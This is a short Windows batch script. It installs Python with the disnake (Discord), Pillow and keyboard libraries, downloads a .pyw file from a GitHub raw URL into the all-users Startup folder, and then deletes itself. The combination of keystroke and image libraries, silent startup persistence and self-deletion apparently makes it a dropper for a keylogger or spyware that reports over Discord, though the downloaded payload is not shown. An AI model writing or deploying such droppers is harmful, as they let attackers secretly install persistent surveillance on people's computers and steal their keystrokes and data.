@echo off
winget py
py -m pip install disnake
py -m pip install Pillow
py -m pip install keyboard
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
curl -O https://raw.githubusercontent.com/Z-tech2/t/main/main.pyw
del %0
